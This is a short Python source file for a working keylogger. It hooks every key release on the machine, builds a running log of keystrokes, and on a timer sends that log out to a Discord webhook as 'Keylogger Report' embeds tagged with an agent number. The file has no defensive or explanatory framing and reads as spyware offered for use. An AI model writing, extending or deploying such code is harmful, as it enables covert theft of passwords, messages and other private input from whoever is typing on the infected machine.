import keyboard 
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed


class Keylogger:
    def __init__(self, interval, ID, webhook, report_method="webhook"):
        self.id = ID
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.webhook = webhook

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_webhook(self):
        webhook = DiscordWebhook(url=self.webhook, username="Keylogger")
        embed = DiscordEmbed(title=f"Keylogger Report | Agent#{self.id} | Time: {self.end_dt}", description=self.log)
        webhook.add_embed(embed)
        webhook.execute()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            if self.report_method == "webhook":
                self.report_to_webhook()    
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
